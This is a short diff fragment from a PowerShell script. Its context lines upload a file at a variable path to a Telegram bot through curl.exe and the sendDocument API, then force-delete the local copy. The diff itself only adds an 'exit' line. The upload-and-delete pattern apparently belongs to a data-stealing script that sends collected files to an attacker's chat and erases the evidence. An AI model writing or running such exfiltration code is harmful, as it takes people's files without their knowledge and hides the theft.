@@ -18,4 +18,4 @@ if (Test-Path $p) {
     curl.exe -F "document=@$p" "https://api.telegram.org/bot$token/sendDocument?chat_id=$id"
     rm $p -Force
 }
-
+exit
